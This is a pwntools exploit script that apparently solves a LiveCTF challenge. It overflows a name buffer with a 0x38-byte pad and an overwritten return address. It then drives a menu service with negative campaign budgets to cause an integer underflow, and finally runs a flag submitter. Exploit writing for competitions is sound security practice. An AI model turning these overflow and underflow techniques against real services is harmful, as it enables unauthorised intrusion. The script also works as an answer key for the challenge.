#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))

sla = lambda x, y: io.sendlineafter(x, y)
sa = lambda x, y: io.sendafter(x, y)
sl = lambda x: io.sendline(x)
s = lambda x: io.send(x)
rv = lambda x: io.recv(x)
rvu = lambda x: io.recvuntil(x)
rvl = lambda : io.recvline()
ia = lambda : io.interactive()


sla(b'Enter your name: ', b'a'*0x38 + p64(0x4015EA))

sla(b'Choice: ', b'D')
sla(b'Choice: ', b'H')
sla(b'Enter agent name: ', b'name')
sla(b'Choice: ', b'X')

sla(b'Choice: ', b'A')
sla(b'Choice: ', b'C')
sla(b'Enter campaign name: ', b'name')
sla(b'Enter campaign budget: ', b'1')
sla(b'Region: ', b'1')
sla(b'Choice: ', b'0')
sla(b'Agent ID: ', b'1')
sla(b'Keyword 1: ', b'a')
sla(b'Keyword 2: ', b'b')
sla(b'Keyword 3: ', b'c')
sla(b'Keyword 4: ', b'd')
sla(b'Keyword 5: ', b'e')

sla(b'Choice: ', b'E')
sla(b'Which campaign would you like to edit? (0 to cancel): ', b'1')
sla(b'Edit campaign budget (current: $1): ', b'-1999999999') # -19999999999
sla(b'Would you like to change the agent? (y/n): ', b'n')
sla(b'Would you like to change the product? (y/n): ', b'n')

sla(b'Choice: ', b'E')
sla(b'Which campaign would you like to edit? (0 to cancel): ', b'1')
sla(b'Edit campaign budget (current: $-1999999999): ', b'-19999999999')
sla(b'Would you like to change the agent? (y/n): ', b'n')
sla(b'Would you like to change the product? (y/n): ', b'n')

sla(b'Choice: ', b'P')
sla(b'Which campaign would you like to toggle? (0 to cancel): ', b'1')

sla(b'Choice: ', b'X')
sla(b'Choice: ', b'N')


rvu(b"You've mastered the art of Multi-Level Model Marketing!\n")
sl(b'./submitter')
log.info(rv(200))
# sl(b'')

# flag = r.recvline_contains(b'LiveCTF{').decode().strip()
# log.info('Flag: %s', flag)
